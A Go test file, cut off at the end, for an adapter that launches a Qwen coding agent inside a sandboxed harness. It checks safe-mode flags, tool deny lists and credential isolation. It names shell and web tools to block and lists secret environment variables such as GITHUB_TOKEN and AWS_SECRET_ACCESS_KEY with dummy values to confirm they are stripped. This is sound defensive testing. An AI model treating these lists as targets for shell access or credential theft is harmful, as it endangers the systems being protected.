package qwen

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/chiga0/marshal-harness/internal/contract"
	"github.com/chiga0/marshal-harness/internal/domain"
	"github.com/chiga0/marshal-harness/internal/port"
)

// supportedBinary pins the fixture default to the first member of the
// supported set; Probe coverage iterates the whole set explicitly.
var supportedBinary = supportedBinaries[0]

func TestNewRequiresExactExecutableAndValidator(t *testing.T) {
	validator := newValidator(t)
	validExecutable := fakeExecutable(t, supportedBinary, "", "", "exit 0")
	resolvedExecutable, err := filepath.EvalSymlinks(validExecutable)
	if err != nil {
		t.Fatal(err)
	}
	for _, test := range []struct {
		name      string
		prepare   func(t *testing.T) string
		validator *contract.Validator
		wantErr   string
		wantReal  string
	}{
		{
			name:      "relative-path",
			prepare:   func(t *testing.T) string { return "qwen" },
			validator: validator,
			wantErr:   "absolute clean path",
		},
		{
			name: "unclean-path",
			prepare: func(t *testing.T) string {
				return filepath.Dir(validExecutable) + "/../" + filepath.Base(validExecutable)
			},
			validator: validator,
			wantErr:   "absolute clean path",
		},
		{
			name:      "missing-file",
			prepare:   func(t *testing.T) string { return filepath.Join(t.TempDir(), "qwen") },
			validator: validator,
			wantErr:   "resolve qwen executable",
		},
		{
			name:    "nil-validator",
			prepare: func(t *testing.T) string { return validExecutable },
			wantErr: "contract validator is required",
		},
		{
			name: "non-executable-file",
			prepare: func(t *testing.T) string {
				path := filepath.Join(t.TempDir(), "qwen")
				if err := os.WriteFile(path, []byte("data"), 0o600); err != nil {
					t.Fatal(err)
				}
				return path
			},
			validator: validator,
			wantErr:   "executable regular file",
		},
		{
			name:      "directory",
			prepare:   func(t *testing.T) string { return t.TempDir() },
			validator: validator,
			wantErr:   "executable regular file",
		},
		{
			name: "symlink-resolved",
			prepare: func(t *testing.T) string {
				link := filepath.Join(t.TempDir(), "qwen")
				if err := os.Symlink(validExecutable, link); err != nil {
					t.Fatal(err)
				}
				return link
			},
			validator: validator,
			wantReal:  resolvedExecutable,
		},
		{
			name:      "valid",
			prepare:   func(t *testing.T) string { return validExecutable },
			validator: validator,
			wantReal:  resolvedExecutable,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			adapter, err := New(test.prepare(t), test.validator)
			if test.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), test.wantErr) {
					t.Fatalf("err = %v, want %q", err, test.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if adapter.executable != test.wantReal {
				t.Fatalf("executable = %s, want %s", adapter.executable, test.wantReal)
			}
		})
	}
}

func TestPrepareTerminalFreezesNativeTUIWithoutPromptOrCapturedMode(t *testing.T) {
	t.Setenv("GITHUB_TOKEN", "publisher-secret")
	fixture := newRunFixture(t, supportedBinary, "exit 0")
	spec, err := fixture.adapter.PrepareTerminal(context.Background(), fixture.request)
	if err != nil {
		t.Fatal(err)
	}
	joinedArgs := strings.Join(spec.Arguments, "\x00")
	joinedEnv := strings.Join(spec.Environment, "\n")
	if spec.AdapterID != adapterID || spec.BinaryVersion != supportedBinary || spec.Executable != fixture.executable || !strings.HasPrefix(spec.ExecutableDigest, "sha256:") || spec.WorkingDirectory != fixture.worktree {
		t.Fatalf("identity = %+v", spec)
	}
	if spec.InitialPrompt != "完成 fixture" || spec.CompletionGate != port.TerminalCompletionSupervisedConfirmation {
		t.Fatalf("prompt/gate = %q %q", spec.InitialPrompt, spec.CompletionGate)
	}
	for _, forbidden := range []string{"--output-format", "stream-json", "-p", "完成 fixture"} {
		if containsArgument(spec.Arguments, forbidden) {
			t.Fatalf("native argv contains captured argument %q: %#v", forbidden, spec.Arguments)
		}
	}
	for _, required := range []string{"--safe-mode", "--approval-mode", "--max-wall-time", "--max-tool-calls", "--max-session-turns", "--exclude-tools", "--chat-recording=false"} {
		if !strings.Contains(joinedArgs, required) {
			t.Fatalf("native argv lacks %q: %#v", required, spec.Arguments)
		}
	}
	if strings.Contains(joinedEnv, "GITHUB_TOKEN") || strings.Contains(joinedEnv, "publisher-secret") {
		t.Fatalf("publisher credential leaked: %s", joinedEnv)
	}
	if strings.Contains(joinedEnv, "CI=1") || !strings.Contains(joinedEnv, "TERM=xterm-256color") || !strings.Contains(joinedEnv, "COLORTERM=truecolor") {
		t.Fatalf("native TUI environment is not interactive: %s", joinedEnv)
	}
}

func containsArgument(arguments []string, target string) bool {
	for _, argument := range arguments {
		if argument == target {
			return true
		}
	}
	return false
}

func TestProbeFreezesSupportedAndUnsupportedBinary(t *testing.T) {
	for _, test := range []struct {
		version, status string
		expectErrors    bool
	}{
		{"0.21.5", "supported", false},
		{"0.21.10", "supported", false},
		{"0.21.11", "supported", false},
		{"0.21.4", "unsupported", true},
		{"9.9.9", "unsupported", true},
	} {
		t.Run(test.version, func(t *testing.T) {
			adapter, err := New(fakeExecutable(t, test.version, "", "", "exit 0"), newValidator(t))
			if err != nil {
				t.Fatal(err)
			}
			record, err := adapter.Probe(context.Background())
			if err != nil {
				t.Fatal(err)
			}
			independent := newValidator(t)
			if err := independent.Validate(domain.KindCapabilitySnapshot, record.Data); err != nil {
				t.Fatalf("snapshot failed real schema validation: %v", err)
			}
			var raw map[string]any
			if err := json.Unmarshal(record.Data, &raw); err != nil {
				t.Fatal(err)
			}
			status, _ := raw["probeStatus"].(string)
			version, _ := raw["binaryVersion"].(string)
			digest, _ := raw["executableDigest"].(string)
			executable, _ := raw["executable"].(string)
			if status != test.status || version != test.version || !strings.HasPrefix(digest, "sha256:") || !filepath.IsAbs(executable) {
				t.Fatalf("snapshot = %s/%s/%s/%s", status, version, digest, executable)
			}
			if raw["adapterId"] != adapterID || raw["apiVersion"] != string(domain.APIVersionV1Alpha1) || raw["kind"] != string(domain.KindCapabilitySnapshot) {
				t.Fatalf("snapshot identity = %v", raw)
			}
			probeErrors, _ := raw["probeErrors"].([]any)
			if test.expectErrors {
				if len(probeErrors) != 1 {
					t.Fatalf("probeErrors = %v", probeErrors)
				}
				message, _ := probeErrors[0].(string)
				if !strings.Contains(message, test.version) {
					t.Fatalf("probeErrors must report the actual version: %v", probeErrors)
				}
				for _, supported := range supportedBinaries {
					if !strings.Contains(message, supported) {
						t.Fatalf("probeErrors must list supported version %s: %v", supported, probeErrors)
					}
				}
			} else if len(probeErrors) != 0 {
				t.Fatalf("probeErrors = %v", probeErrors)
			}
		})
	}
	t.Run("schema-enforces-enums", func(t *testing.T) {
		adapter, err := New(fakeExecutable(t, supportedBinary, "", "", "exit 0"), newValidator(t))
		if err != nil {
			t.Fatal(err)
		}
		record, err := adapter.Probe(context.Background())
		if err != nil {
			t.Fatal(err)
		}
		var raw map[string]any
		if err := json.Unmarshal(record.Data, &raw); err != nil {
			t.Fatal(err)
		}
		raw["probeStatus"] = "bogus"
		data, err := json.Marshal(raw)
		if err != nil {
			t.Fatal(err)
		}
		if newValidator(t).Validate(domain.KindCapabilitySnapshot, data) == nil {
			t.Fatal("schema accepted corrupted snapshot")
		}
	})
	t.Run("unrecognized-version", func(t *testing.T) {
		adapter, err := New(fakeExecutable(t, "garbage-output", "", "", "exit 0"), newValidator(t))
		if err != nil {
			t.Fatal(err)
		}
		if _, err := adapter.Probe(context.Background()); err == nil || !strings.Contains(err.Error(), "unrecognized version") {
			t.Fatalf("err = %v", err)
		}
	})
}

func TestBuildArgsLocksHardeningFlagsAndNeverGrantsYolo(t *testing.T) {
	denied := strings.Join(excludedTools, ",")
	locked := []string{
		"--safe-mode", "--approval-mode", "auto-edit", "--output-format", "stream-json",
		"--max-wall-time", "42", "--max-tool-calls", "200", "--max-session-turns", "60",
		"--exclude-tools", denied,
	}
	full := func(extra ...string) []string {
		want := append([]string{}, locked...)
		want = append(want, extra...)
		return append(want, "-p", "完成任务")
	}
	for _, test := range []struct {
		name, policy, sessionID, model string
		want                           []string
	}{
		{"ephemeral-with-model", "ephemeral", "", "provider/model", full("--chat-recording=false", "--model", "provider/model")},
		{"ephemeral-without-model", "ephemeral", "", "", full("--chat-recording=false")},
		{"persist-with-model", "persist", "", "provider/model", full("--chat-recording=true", "--model", "provider/model")},
		{"persist-without-model", "persist", "", "", full("--chat-recording=true")},
		{"resume-exact-session", "resume", "session-9", "", full("--chat-recording=true", "--resume", "session-9")},
		{"resume-exact-session-with-model", "resume", "session-9", "provider/model", full("--chat-recording=true", "--resume", "session-9", "--model", "provider/model")},
	} {
		t.Run(test.name, func(t *testing.T) {
			args, err := buildArgs("workspace-write", test.policy, test.sessionID, test.model, 42, "完成任务")
			if err != nil {
				t.Fatal(err)
			}
			if !slices.Equal(args, test.want) {
				t.Fatalf("args = %#v, want %#v", args, test.want)
			}
			for _, arg := range args {
				if strings.Contains(strings.ToLower(arg), "yolo") || arg == "--continue" {
					t.Fatalf("forbidden flag present in args: %#v", args)
				}
			}
			if test.policy != "resume" && slices.Contains(args, "--resume") {
				t.Fatalf("--resume must never appear for %s: %#v", test.policy, args)
			}
		})
	}
	t.Run("read-only-excludes-write-tools", func(t *testing.T) {
		args, err := buildArgs("read-only", "ephemeral", "", "", 42, "完成任务")
		if err != nil {
			t.Fatal(err)
		}
		want := append([]string{}, locked...)
		want[len(want)-1] = strings.Join(readOnlyExcludedTools, ",")
		want = append(want, "--chat-recording=false", "-p", "完成任务")
		if !slices.Equal(args, want) {
			t.Fatalf("read-only args = %#v, want %#v", args, want)
		}
	})
	t.Run("unknown-policy-fails-closed", func(t *testing.T) {
		for _, policy := range []string{"", "weird", "EPHEMERAL", "continue", "resume-latest"} {
			if _, err := buildArgs("workspace-write", policy, "session-9", "", 42, "完成任务"); err == nil || !strings.Contains(err.Error(), "session policy") {
				t.Fatalf("policy %q err = %v, want unsupported session policy", policy, err)
			}
		}
	})
}

func TestExcludedToolsDenyShellAgentWebAndEveryComputerUse(t *testing.T) {
	computerUse := []string{
		"bring_to_front", "check_for_update", "check_permissions", "click", "double_click", "drag",
		"end_session", "get_accessibility_tree", "get_agent_cursor_state", "get_config",
		"get_cursor_position", "get_recording_state", "get_screen_size", "get_window_state", "hotkey",
		"kill_app", "launch_app", "list_apps", "list_windows", "move_cursor", "page", "press_key",
		"replay_trajectory", "right_click", "scroll", "set_agent_cursor_enabled",
		"set_agent_cursor_motion", "set_agent_cursor_style", "set_config", "set_value",
		"start_recording", "start_session", "stop_recording", "type_text", "zoom",
	}
	want := []string{"shell", "run_shell_command", "agent", "sub_agent", "create_sub_session", "web_fetch", "web_search"}
	for _, tool := range computerUse {
		want = append(want, "computer_use__"+tool)
	}
	if !slices.Equal(excludedTools, want) {
		t.Fatalf("excludedTools drifted from the locked deny list:\n got %#v\nwant %#v", excludedTools, want)
	}
}

func TestReadOnlyExcludedToolsAddWriteClassExceptArtifactWriter(t *testing.T) {
	want := append([]string{}, excludedTools...)
	want = append(want, "apply_patch", "edit", "insert", "multiedit", "notebook_edit", "patch", "replace", "save_file", "save_memory", "write", "write_todos")
	if !slices.Equal(readOnlyExcludedTools, want) {
		t.Fatalf("readOnlyExcludedTools drifted:\n got %#v\nwant %#v", readOnlyExcludedTools, want)
	}
	if slices.Contains(readOnlyExcludedTools, "write_file") {
		t.Fatal("write_file must stay granted so read-only workers can produce artifacts")
	}
	if excludedToolsFor("read-only") == nil || excludedToolsFor("workspace-write") == nil || len(excludedToolsFor("read-only")) <= len(excludedToolsFor("workspace-write")) {
		t.Fatal("profile exclusion selection is wrong")
	}
}

func TestConvergedExcludedToolsApplyReverseExclusion(t *testing.T) {
	t.Run("undeclared-keeps-profile-base", func(t *testing.T) {
		if !slices.Equal(convergedExcludedTools("workspace-write", nil), excludedTools) {
			t.Fatal("undeclared workspace-write exclusions drifted from the frozen base")
		}
		if !slices.Equal(convergedExcludedTools("read-only", nil), readOnlyExcludedTools) {
			t.Fatal("undeclared read-only exclusions drifted from the frozen base")
		}
	})
	t.Run("declared-read-edit-excludes-undeclared-write-and-execute", func(t *testing.T) {
		converged := convergedExcludedTools("workspace-write", []string{"read", "edit"})
		for _, excluded := range []string{"write", "write_file", "save_memory", "write_todos", "shell", "run_shell_command", "grep", "glob", "ls"} {
			if !slices.Contains(converged, excluded) {
				t.Fatalf("undeclared tool %q is not excluded: %#v", excluded, converged)
			}
		}
		for _, granted := range []string{"read_file", "read_many_files", "edit", "replace", "apply_patch"} {
			if slices.Contains(converged, granted) {
				t.Fatalf("declared surface tool %q was excluded: %#v", granted, converged)
			}
		}
		// The frozen base stays a prefix: convergence only appends.
		if !slices.Equal(converged[:len(excludedTools)], excludedTools) {
			t.Fatal("convergence must keep the frozen exclusion base intact")
		}
	})
	t.Run("declared-bash-stays-excluded", func(t *testing.T) {
		converged := convergedExcludedTools("workspace-write", []string{"read", "bash"})
		for _, denied := range []string{"shell", "run_shell_command"} {
			if !slices.Contains(converged, denied) {
				t.Fatalf("bash declaration must never un-exclude %q: %#v", denied, converged)
			}
		}
	})
}

func TestRunDeclaredToolsConvergeExcludeArgv(t *testing.T) {
	body := strings.Join([]string{initEvent("session-1", supportedBinary), resultEvent("success", 1, 1)}, "\n")
	fixture := newRunFixture(t, supportedBinary, body)
	writeJSON(t, filepath.Join(fixture.controlRoot, "input", "task-spec.json"), map[string]any{"worker": map[string]any{"model": "provider/model", "tools": []string{"read", "edit"}}})
	if _, err := fixture.adapter.Run(context.Background(), fixture.request); err != nil {
		t.Fatal(err)
	}
	argv := readArgsLog(t, fixture.argsPath)
	excluded := strings.Split(excludeArgValue(t, argv), ",")
	for _, want := range []string{"write", "write_file", "shell", "run_shell_command", "grep", "glob", "ls"} {
		if !slices.Contains(excluded, want) {
			t.Fatalf("undeclared tool %q missing from --exclude-tools: %#v", want, excluded)
		}
	}
	for _, granted := range []string{"read_file", "edit"} {
		if slices.Contains(excluded, granted) {
			t.Fatalf("declared surface tool %q excluded: %#v", granted, excluded)
		}
	}
}

func TestPrepareTerminalAppliesDeclaredToolAllowlist(t *testing.T) {
	fixture := newRunFixture(t, supportedBinary, "exit 0")
	writeJSON(t, filepath.Join(fixture.controlRoot, "input", "task-spec.json"), map[string]any{"worker": map[string]any{"model": "provider/model", "tools": []string{"read", "edit"}}})
	spec, err := fixture.adapter.PrepareTerminal(context.Background(), fixture.request)
	if err != nil {
		t.Fatal(err)
	}
	excluded := strings.Split(excludeArgValue(t, spec.Arguments), ",")
	for _, want := range []string{"write", "write_file", "save_memory", "write_todos", "shell", "run_shell_command", "grep", "glob", "ls"} {
		if !slices.Contains(excluded, want) {
			t.Fatalf("undeclared tool %q missing from terminal --exclude-tools: %#v", want, spec.Arguments)
		}
	}
	for _, granted := range []string{"read_file", "read_many_files", "edit", "replace", "apply_patch"} {
		if slices.Contains(excluded, granted) {
			t.Fatalf("declared surface tool %q excluded from terminal argv: %#v", granted, spec.Arguments)
		}
	}
	// The frozen exclusion base stays a prefix in terminal mode too.
	if !slices.Equal(excluded[:len(excludedTools)], excludedTools) {
		t.Fatalf("terminal convergence must keep the frozen exclusion base intact: %#v", excluded)
	}
	// A malformed declaration fails closed before any terminal launch spec.
	fixture2 := newRunFixture(t, supportedBinary, "exit 0")
	writeJSON(t, filepath.Join(fixture2.controlRoot, "input", "task-spec.json"), map[string]any{"worker": map[string]any{"tools": []string{"read", "shell"}}})
	if _, err := fixture2.adapter.PrepareTerminal(context.Background(), fixture2.request); err == nil || !strings.Contains(err.Error(), "worker tools") {
		t.Fatalf("err = %v, want fail-closed worker tools rejection in terminal launch", err)
	}
}

func TestRunDeclaredToolsCollectSuccessNamesAndSkipDenials(t *testing.T) {
	body := strings.Join([]string{
		initEvent("session-1", supportedBinary),
		`printf '%s\n' '{"type":"tool","tool_call_id":"t1","tool_name":"read_file"}'`,
		`printf '%s\n' '{"type":"tool","tool_call_id":"t2","tool_name":"edit"}'`,
		`printf '%s\n' '{"type":"tool","tool_call_id":"t3","tool_name":"read_file"}'`,
		`printf '%s\n' '{"type":"tool","tool_call_id":"t4","tool_name":"read_file","args":{"absolute_path":"'"$PWD"'/source.go"},"is_error":true,"error":"permission denied"}'`,
		resultEvent("success", 2, 1),
	}, "\n")
	fixture := newRunFixture(t, supportedBinary, body)
	if err := os.WriteFile(filepath.Join(fixture.worktree, "source.go"), []byte("package x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := fixture.adapter.Run(context.Background(), fixture.request); err != nil {
		t.Fatalf("benign denial must not terminate the attempt: %v", err)
	}
	metadata, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
	if err != nil {
		t.Fatal(err)
	}
	var meta struct {
		ToolNames []string `json:"toolNames"`
	}
	if err := json.Unmarshal(metadata, &meta); err != nil {
		t.Fatal(err)
	}
	// read_file normalizes to read; the denied read probe must not be
	// collected as a successful call.
	if strings.Join(meta.ToolNames, ",") != "edit,read" {
		t.Fatalf("toolNames = %v, want exactly [edit read]", meta.ToolNames)
	}
}

func TestRunRejectsMalformedToolsDeclarationBeforeLaunch(t *testing.T) {
	for _, test := range []struct {
		name  string
		tools any
	}{
		{name: "outside-vocabulary", tools: []string{"read", "shell"}},
		{name: "duplicated", tools: []string{"read", "read"}},
		{name: "wrong-type", tools: "read,edit"},
	} {
		t.Run(test.name, func(t *testing.T) {
			fixture := newRunFixture(t, supportedBinary, "exit 0")
			writeJSON(t, filepath.Join(fixture.controlRoot, "input", "task-spec.json"), map[string]any{"worker": map[string]any{"model": "provider/model", "tools": test.tools}})
			if err := os.Remove(fixture.argsPath); err != nil && !os.IsNotExist(err) {
				t.Fatal(err)
			}
			if _, err := fixture.adapter.Run(context.Background(), fixture.request); err == nil || !strings.Contains(err.Error(), "worker tools") {
				t.Fatalf("err = %v, want fail-closed worker tools rejection", err)
			}
			if _, statErr := os.Stat(fixture.argsPath); !os.IsNotExist(statErr) {
				t.Fatal("worker process was launched despite a malformed tools declaration")
			}
		})
	}
}

func TestWorkerEnvironmentIsolatesCredentials(t *testing.T) {
	worktree := t.TempDir()
	t.Setenv("GITHUB_TOKEN", "publisher-secret")
	t.Setenv("GH_TOKEN", "publisher-secret")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "cloud-secret")
	t.Setenv("GOOGLE_APPLICATION_CREDENTIALS", "/secrets/gcp.json")
	t.Setenv("SSH_AUTH_SOCK", "/tmp/agent.sock")
	t.Setenv("ANTHROPIC_API_KEY", "model-secret")
	t.Setenv("OPENAI_API_KEY", "model-secret")
	t.Setenv("GEMINI_API_KEY", "model-secret")
	t.Setenv("GOOGLE_API_KEY", "model-secret")
	t.Setenv("DASHSCOPE_API_KEY", "model-secret")
	environment := workerEnvironment(worktree)
	joined := strings.Join(environment, "\n")
	for _, secret := range []string{
		"GITHUB_TOKEN", "GH_TOKEN", "AWS_SECRET_ACCESS_KEY", "GOOGLE_APPLICATION_CREDENTIALS",
		"SSH_AUTH_SOCK", "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GEMINI_API_KEY", "GOOGLE_API_KEY",
		"DASHSCOPE_API_KEY", "publisher-secret", "cloud-secret", "model-secret", "/secrets/gcp.json", "/tmp/agent.sock",
	} {
		if strings.Contains(joined, secret) {
			t.Fatalf("worker environment leaked %s", secret)
		}
	}
	for _, required := range []string{"CI=1", "GH_PROMPT_DISABLED=1", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1", "GIT_TERMINAL_PROMPT=0", "PWD=" + worktree} {
		if !slices.Contains(environment, required) {
			t.Fatalf("missing isolation environment %s: %s", required, joined)
		}
	}
}

func TestRunNormalizesResultAndPersistsTranscript(t *testing.T) {
	t.Setenv("GITHUB_TOKEN", "publisher-secret")
	t.Setenv("GH_TOKEN", "publisher-secret")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "cloud-secret")
	t.Setenv("GOOGLE_APPLICATION_CREDENTIALS", "/secrets/gcp.json")
	t.Setenv("SSH_AUTH_SOCK", "/tmp/agent.sock")
	t.Setenv("ANTHROPIC_API_KEY", "model-secret")
	t.Setenv("OPENAI_API_KEY", "model-secret")
	t.Setenv("GEMINI_API_KEY", "model-secret")
	t.Setenv("GOOGLE_API_KEY", "model-secret")
	t.Setenv("DASHSCOPE_API_KEY", "model-secret")
	body := strings.Join([]string{
		initEvent("session-1", supportedBinary),
		toolEvent(),
		resultEvent("success", 120, 40),
		`printf 'qwen warning\n' >&2`,
	}, "\n")
	fixture := newRunFixture(t, supportedBinary, body)
	record, err := fixture.adapter.Run(context.Background(), fixture.request)
	if err != nil {
		t.Fatal(err)
	}
	if err := fixture.validator.Validate(domain.KindWorkerResult, record.Data); err != nil {
		t.Fatal(err)
	}
	var result declaredResult
	if err := json.Unmarshal(record.Data, &result); err != nil {
		t.Fatal(err)
	}
	if result.TaskID != "TASK-1" || result.RunID != "run-1" || result.AttemptID != "attempt-1" {
		t.Fatalf("identity = %+v", result)
	}
	if result.Adapter.ID != adapterID || result.Adapter.Version != supportedBinary || result.Adapter.Executable != fixture.executable || result.Adapter.Model != "provider/model" {
		t.Fatalf("adapter claims = %+v", result.Adapter)
	}
	if result.Session == nil || result.Session.ID != "session-1" || result.Session.Resumable {
		t.Fatalf("ephemeral session must not be resumable: %+v", result.Session)
	}
	if result.Status != "completed" || result.Summary != "fixture completed" {
		t.Fatalf("worker declaration lost: %+v", result)
	}
	if time.Since(result.StartedAt) > 5*time.Minute || time.Since(result.CompletedAt) > 5*time.Minute {
		t.Fatalf("worker-supplied timestamps were not overwritten: %s/%s", result.StartedAt, result.CompletedAt)
	}

	transcript, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript.jsonl"))
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSpace(string(transcript)), "\n")
	if len(lines) != 3 || !strings.Contains(lines[0], `"session_id":"session-1"`) || !strings.Contains(lines[2], `"subtype":"success"`) {
		t.Fatalf("transcript = %s", transcript)
	}
	metadata, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`"eventCount": 3`, `"toolCalls": 1`, `"inputTokens": 120`, `"outputTokens": 40`, `"exitCode": 0`, `"outputTruncated": false`, `"contextError": ""`} {
		if !strings.Contains(string(metadata), want) {
			t.Fatalf("metadata missing %s: %s", want, metadata)
		}
	}
	stderrLog, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-stderr.log"))
	if err != nil || !strings.Contains(string(stderrLog), "qwen warning") {
		t.Fatalf("stderr log = %s err=%v", stderrLog, err)
	}

	normalized, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "worker-result.json"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(normalized), "worker-claim") || !strings.Contains(string(normalized), `"version":"`+supportedBinary+`"`) {
		t.Fatalf("result file was not overwritten by Marshal: %s", normalized)
	}

	argv := readArgsLog(t, fixture.argsPath)
	if !slices.Contains(argv, "--safe-mode") ||
		!containsSequence(argv, "--approval-mode", "auto-edit") ||
		!containsSequence(argv, "--output-format", "stream-json") ||
		!containsSequence(argv, "--max-wall-time", "5") ||
		!containsSequence(argv, "--max-tool-calls", "200") ||
		!containsSequence(argv, "--max-session-turns", "60") ||
		!containsSequence(argv, "--model", "provider/model") {
		t.Fatalf("observed argv = %#v", argv)
	}
	excluded := excludeArgValue(t, argv)
	if !slices.Equal(strings.Split(excluded, ","), excludedTools) {
		t.Fatalf("exclude-tools argument drifted: %s", excluded)
	}
	if got := chatRecordingArg(argv); got != "--chat-recording=false" {
		t.Fatalf("ephemeral chat recording = %q, want --chat-recording=false: %#v", got, argv)
	}
	if slices.Contains(argv, "--resume") || slices.Contains(argv, "--continue") {
		t.Fatalf("ephemeral must never resume or continue: %#v", argv)
	}
	if argv[len(argv)-1] != "完成 fixture" || argv[len(argv)-2] != "-p" {
		t.Fatalf("prompt must be the final -p argument: %#v", argv)
	}
	for _, arg := range argv {
		if strings.Contains(strings.ToLower(arg), "yolo") {
			t.Fatalf("yolo present in observed argv: %#v", argv)
		}
	}

	environment := readLines(t, fixture.envPath)
	for _, secret := range []string{
		"GITHUB_TOKEN", "GH_TOKEN", "AWS_SECRET_ACCESS_KEY", "GOOGLE_APPLICATION_CREDENTIALS",
		"SSH_AUTH_SOCK", "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GEMINI_API_KEY", "GOOGLE_API_KEY",
		"DASHSCOPE_API_KEY", "publisher-secret", "cloud-secret", "model-secret", "/secrets/gcp.json", "/tmp/agent.sock",
	} {
		for _, entry := range environment {
			if strings.Contains(entry, secret) {
				t.Fatalf("worker process observed leaked %s", secret)
			}
		}
	}
	for _, required := range []string{"CI=1", "GH_PROMPT_DISABLED=1", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1", "GIT_TERMINAL_PROMPT=0", "PWD=" + fixture.worktree} {
		if !slices.Contains(environment, required) {
			t.Fatalf("worker process missing isolation environment %s", required)
		}
	}
}

func TestRunRejectsProtocolViolations(t *testing.T) {
	for _, test := range []struct {
		name    string
		body    string
		message string
	}{
		{
			name:    "wrong-cwd",
			body:    wrongCwdEvent() + "\n" + resultEvent("success", 1, 1),
			message: "does not match worktree",
		},
		{
			name:    "missing-result",
			body:    initEvent("session-1", supportedBinary),
			message: "without a result event",
		},
		{
			name:    "trailing-event-after-success",
			body:    initEvent("session-1", supportedBinary) + "\n" + resultEvent("success", 1, 1) + "\n" + `printf '%s\n' '{"type":"assistant"}'`,
			message: "trailing event after result",
		},
		{
			name:    "malformed-jsonl",
			body:    initEvent("session-1", supportedBinary) + "\n" + `printf '%s\n' 'not-json'`,
			message: "malformed JSONL",
		},
		{
			name:    "first-event-not-init",
			body:    toolEvent() + "\n" + resultEvent("success", 1, 1),
			message: "first event must be system/init",
		},
		{
			name:    "stream-binary-version-mismatch",
			body:    initEvent("session-1", "0.20.0") + "\n" + resultEvent("success", 1, 1),
			message: "does not match binary",
		},
		{
			name:    "empty-stream",
			body:    "exit 0",
			message: "without a result event",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			fixture := newRunFixture(t, supportedBinary, test.body)
			_, err := fixture.adapter.Run(context.Background(), fixture.request)
			if !errors.Is(err, ErrProtocol) || !strings.Contains(err.Error(), test.message) {
				t.Fatalf("err = %v, want ErrProtocol %q", err, test.message)
			}
			if _, statErr := os.Stat(filepath.Join(fixture.controlRoot, "output", "qwen-transcript.jsonl")); statErr != nil {
				t.Fatal("transcript evidence was not preserved on protocol failure")
			}
		})
	}
	t.Run("failed-result-is-typed-provider-terminal", func(t *testing.T) {
		// 非 success 的 result subtype 不再拼接自由文本，而是 typed
		// provider-terminal/do-not-retry；exitCode=0 不构成成功证据。
		body := initEvent("session-1", supportedBinary) + "\n" + resultEvent("error_max_turns", 0, 0)
		fixture := newRunFixture(t, supportedBinary, body)
		_, err := fixture.adapter.Run(context.Background(), fixture.request)
		failure, ok := port.AsAdapterFailure(err)
		if !ok || failure.Kind != port.FailureKindProviderTerminal || failure.Disposition != port.RetryDispositionDoNotRetry || failure.Adapter != port.AdapterIDQwen {
			t.Fatalf("err = %v, want typed provider-terminal failure", err)
		}
		if errors.Is(err, context.Canceled) {
			t.Fatalf("typed failure must not degrade to context error: %v", err)
		}
		if _, statErr := os.Stat(filepath.Join(fixture.controlRoot, "output", "qwen-transcript.jsonl")); statErr != nil {
			t.Fatal("transcript evidence was not preserved on typed failure")
		}
	})
}

func TestRunRejectsDeclarationViolations(t *testing.T) {
	successBody := strings.Join([]string{initEvent("session-1", supportedBinary), resultEvent("success", 1, 1)}, "\n")
	for _, test := range []struct {
		name      string
		overrides map[string]any
		message   string
	}{
		{"task-id-mismatch", map[string]any{"taskId": "OTHER"}, "identity"},
		{"run-id-mismatch", map[string]any{"runId": "OTHER"}, "identity"},
		{"attempt-id-mismatch", map[string]any{"attemptId": "OTHER"}, "identity"},
		{"adapter-id-mismatch", map[string]any{"adapter": map[string]any{"id": "pi", "executable": "/fake/qwen", "version": "worker-claim"}}, "identity"},
		{"session-mismatch", map[string]any{"session": map[string]any{"id": "claimed-other", "resumable": false}}, "session does not match transcript"},
		{"schema-invalid-status", map[string]any{"status": "weird"}, "validate WorkerResult declaration"},
	} {
		t.Run(test.name, func(t *testing.T) {
			fixture := newRunFixture(t, supportedBinary, successBody)
			fixture.writeDeclared(t, test.overrides)
			if _, err := fixture.adapter.Run(context.Background(), fixture.request); err == nil || !strings.Contains(err.Error(), test.message) {
				t.Fatalf("err = %v, want %q", err, test.message)
			}
		})
	}
	t.Run("missing-result-declaration", func(t *testing.T) {
		fixture := newRunFixture(t, supportedBinary, successBody)
		if err := os.Remove(filepath.Join(fixture.controlRoot, "output", "worker-result.json")); err != nil {
			t.Fatal(err)
		}
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); err == nil || !strings.Contains(err.Error(), "WorkerResult declaration") {
			t.Fatalf("err = %v", err)
		}
		for _, evidence := range []string{"qwen-transcript.jsonl", "qwen-transcript-meta.json", "qwen-stderr.log"} {
			if _, statErr := os.Stat(filepath.Join(fixture.controlRoot, "output", evidence)); statErr != nil {
				t.Fatalf("evidence %s was not preserved: %v", evidence, statErr)
			}
		}
	})
}

func TestRunRejectsMismatchedRequestBeforeLaunch(t *testing.T) {
	successBody := strings.Join([]string{initEvent("session-1", supportedBinary), resultEvent("success", 1, 1)}, "\n")
	fixture := newRunFixture(t, supportedBinary, successBody)
	for _, test := range []struct {
		name    string
		apply   func(t *testing.T) domain.Record
		message string
	}{
		{
			name: "wrong-kind",
			apply: func(t *testing.T) domain.Record {
				return domain.Record{Kind: domain.KindOutcome, Data: fixture.request.Data}
			},
			message: "expected WorkerRequest",
		},
		{
			name:    "invalid-request-schema",
